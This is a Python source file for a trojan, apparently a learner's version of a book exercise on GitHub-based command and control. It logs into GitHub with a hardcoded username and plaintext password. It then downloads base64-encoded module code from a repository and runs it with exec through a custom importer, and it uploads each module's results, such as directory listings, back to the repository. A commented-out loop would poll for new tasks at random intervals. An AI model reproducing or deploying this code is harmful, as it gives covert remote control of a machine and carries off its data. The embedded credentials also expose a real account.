import json
import base64
import sys
import time
import imp
import random
import  threading
import queue
import os

from github3 import login,repos

trojan_id="abc"
trajan_config="%s.json"%trojan_id
data_path="data/%s/"%trojan_id
trojan_modules=[]
configured=False
task_queue=queue.Queue()
def connet_to_github():
    gh=login(username="theonezeroxf",password="XFblackzero9810")
    repo=gh.repository("theonezeroxf","chapter7")
    branch=repo.branch("v1")
    return gh,repo,branch
def get_file_contents(filepath):
    gh,repo,branch=connet_to_github()
    # print(branch)
    # print(help(branch.commit.commit.tree.to_tree()))
    tree=branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        # print(filename.path)
        if filepath in filename.path:
            print("[*] found file %s"%filepath)
            blob=repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def get_trojan_config():
    global configured
    config_json=get_file_contents(trajan_config)
    # print(config_json)
    config=json.loads(base64.b64decode(config_json))
    configured=True
    # for task in config:
        # if task['module'] not in sys.modules:
            # exec("import %s"%task['module'])
    return config

def store_module_result(data):
    gh,repo,branch=connet_to_github()
    remote_path="data/%s/%d.data"%(trojan_id,random.randint(1e3,1e5))
    repo.create_file(remote_path,"Commit message",base64.b64encode(data.encode()))
    return 
class GitImporter(object):
    def __init__(self):self.current_module_code=""
    def find_module(self,fullname,path=None):
        if configured:
            print("[*] Attempting to retrieve %s"%fullname)
            new_library=get_file_contents("modules/%s"%fullname)
            if new_library is not None:
                self.current_module_code=base64.b64decode(new_library).decode()
                return self
        return None
    
    def load_module(self,name):
        module=imp.new_module(name)
        print(self.current_module_code)
        exec(self.current_module_code,module.__dict__)
        sys.modules[name]=module
        return module
def module_runner(module):
    task_queue.put(1)
    result=sys.modules[module].run()
    task_queue.get()
    store_module_result(result)
    return 
def main():
    # print(get_file_contents("dir_lister.py"))
    config=get_trojan_config()
    gimp=GitImporter()
    gimp.find_module('dir_lister.py')
    module=gimp.load_module('dirlister')
    module_runner('dirlister')
    # sys.meta_path=[GitImporter()]
    # while True:
    #     if task_queue.empty():
    #         config=get_trojan_config()
    #         for task in config:
    #             t=threading.Thread(target=module_runner,args=(task['module'],))
    #             t.start()
    #             time.sleep(random.randint(1,10))
    #     time.sleep(random.randint(1e3,1e4))
def test():
    gh,repo,brach=connet_to_github()
    print(dir(repo))
    print(help(repo))
if __name__=="__main__":
    # test()
    main()